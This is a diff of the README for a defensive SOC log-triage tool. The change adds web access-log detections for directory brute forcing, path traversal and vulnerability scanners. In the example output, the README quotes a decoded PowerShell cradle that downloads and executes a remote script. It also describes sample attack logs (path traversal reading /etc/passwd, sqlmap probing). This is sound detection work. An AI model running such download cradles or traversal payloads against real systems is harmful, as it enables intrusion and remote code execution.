@@ -1,6 +1,6 @@
 # soc-log-triage
 
-A command line tool for first-pass SOC triage. It reads Linux `auth.log` and `auditd` logs, Windows Security events and Sysmon exports, normalizes them, runs detection rules mapped to **MITRE ATT&CK**, and produces alerts as terminal output, JSON (for a SIEM or SOAR pipeline) or a Markdown incident triage report.
+A command line tool for first-pass SOC triage. It reads Linux `auth.log` and `auditd` logs, Windows Security events, Sysmon exports and web server access logs, normalizes them, runs detection rules mapped to **MITRE ATT&CK**, and produces alerts as terminal output, JSON (for a SIEM or SOAR pipeline) or a Markdown incident triage report.
 
 No dependencies beyond the Python 3.10+ standard library.
 
@@ -20,6 +20,9 @@ No dependencies beyond the Python 3.10+ standard library.
 | FILE-001 | Office or script host dropping an executable or script | T1105, T1204.002 |
 | KERB-001 | Kerberoasting: RC4 service tickets for several service accounts | T1558.003 |
 | KERB-002 | AS-REP roasting: TGTs issued without pre-authentication | T1558.004 |
+| WEB-001 | Directory / file brute forcing (404 flood), listing what the scan found | T1595.003 |
+| WEB-002 | Path traversal and local file inclusion, including double-encoded payloads | T1190 |
+| WEB-003 | Vulnerability scanner user agents (sqlmap, nikto, gobuster, ...) | T1595.002 |
 | EVADE-001 | Security event log cleared | T1685.005 |
 
 Logic, tuning, false positives and known gaps for each rule are in [docs/DETECTIONS.md](docs/DETECTIONS.md). The same detections are published as **Sigma rules** in [sigma/](sigma/README.md), validated with `sigma-cli` in CI and convertible to Splunk, Elastic, Sentinel and other SIEMs. ATT&CK IDs follow ATT&CK v20.1.
@@ -43,7 +46,7 @@ python -m soc_triage scan sample_logs/* --year 2026
     what : PowerShell started with an encoded command; decoded script contains: downloadstring, iex, net.webclient.
     decoded: IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/update.ps1')
 ...
-Summary: 5 critical, 10 high, 8 medium
+Summary: 6 critical, 10 high, 11 medium
 ```
 
 See the full Markdown report it produces: [docs/example_report.md](docs/example_report.md).
@@ -58,7 +61,7 @@ python -m soc_triage scan /var/log/auth.log --output markdown --out-file report.
 python -m soc_triage scan events.jsonl --output json --fail-on high
 
 # Tune thresholds for a noisy environment
-python -m soc_triage scan auth.log --bf-count 20 --bf-window 10 --spray-users 8 --kerb-services 5 --min-severity high
+python -m soc_triage scan auth.log --bf-count 20 --bf-window 10 --spray-users 8 --kerb-services 5 --web-404 50 --min-severity high
 
 # Suppress auth alerts from trusted sources (vulnerability scanner, jump hosts)
 python -m soc_triage scan auth.log --allow-ip 10.10.5.0/24 --allow-file trusted_sources.txt
@@ -71,6 +74,7 @@ Or install it to get a `soc-triage` command: `pip install -e .[dev]`.
 ### Input formats
 
 - **Linux:** `auth.log` / `secure` with classic syslog (`Nov 10 02:13:04`, treated as UTC; set the year with `--year`) or ISO-8601 timestamps.
+- **Web servers:** Apache and Nginx access logs in the combined or common format, with any time zone offset. Escaped quotes and junk request lines (such as TLS handshakes sent to port 80) are handled; lines that do not match are skipped.
 - **Linux auditd:** `/var/log/audit/audit.log` records `USER_AUTH`, `USER_LOGIN`, `ADD_USER` and `USER_MGMT` (group changes), with the optional `node=` host prefix, hex-encoded account names and the enriched log format. A failed SSH login writes two records; it is counted once.
 - **Sysmon:** events 1 (process create), 3 (network connection) and 11 (file create) as JSON lines or a JSON array, with Sysmon's own field names (`Image`, `ParentImage`, `CommandLine`, `DestinationIp`, `TargetFilename`, `UtcTime`, ...). Recognised by `Channel` or by the presence of `Image`, so they can be mixed with Security events in one file.
 - **Windows:** Security events as JSON lines or a JSON array with fields such as `EventID`, `TimeCreated`, `Computer`, `TargetUserName`, `SubjectUserName`, `IpAddress`, `CommandLine`. Event IDs used: 1102, 4624, 4625, 4688, 4720, 4728, 4732, 4756, and from domain controllers 4768, 4769, 4771 (Kerberos). IPv4-mapped addresses (`::ffff:10.0.0.5`) and `user@REALM` names are normalised. An export like this works:
@@ -92,7 +96,8 @@ Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4624,4625,4688,4720,4732,
 4. An RDP brute force against a jump host, a new local admin, then the Security log cleared.
 5. A second server, `web02`, logging through auditd (`audit.log`): brute force that lands, then a `systemd-sync` account added to `wheel`.
 6. The domain controller's view (`dc01_security.jsonl`): from the compromised workstation the attacker sprays Kerberos passwords (4771 only, no 4625s), AS-REP roasts two accounts and Kerberoasts four service accounts. Legacy RC4 to computer accounts, krbtgt and a single service stays quiet.
-7. The same finance workstation seen through Sysmon (`sysmon.jsonl`): Word drops a `.vbs`, launches PowerShell, PowerShell calls out to the internet and writes `update.exe`.
+7. The public web server (`web_access.log`): gobuster brute forcing directories (and finding three), a path traversal attack that reads `/etc/passwd` using plain, encoded and double-encoded payloads, and sqlmap probing a search parameter. A stray 404 and a file called `report..final.pdf` stay quiet.
+8. The same finance workstation seen through Sysmon (`sysmon.jsonl`): Word drops a `.vbs`, launches PowerShell, PowerShell calls out to the internet and writes `update.exe`.
 
 It also includes benign activity that must **not** alert: a user mistyping their password, `-ExecutionPolicy Bypass` scripts, and a non-privileged group change. All IPs come from the RFC 5737 documentation ranges.
 
@@ -127,10 +132,13 @@ Done in v0.2.0: allow-lists and IP scope (#1), Sysmon (#2), auditd (#3), Sigma r
 
 Done in v0.3.0: Kerberoasting, AS-REP roasting and Kerberos password spraying (#9).
 
+Done in v0.4.0: web server access logs, directory brute forcing, path traversal and scanner detection (#11).
+
 Next:
 - Golden and silver ticket indicators (4769 without a matching 4768, unusual ticket lifetimes)
 - Offline GeoIP and ASN enrichment for external sources
-- Web server access logs (Apache/Nginx): scanning, path traversal and web shell patterns
+- Web shell detection: new script files that receive POST requests from few sources (T1505.003)
+- SQL injection patterns in web requests
 - Express AUTH-003 and ACCT-003 as Sigma temporal correlations once backends support chained correlations well
 
 ## License
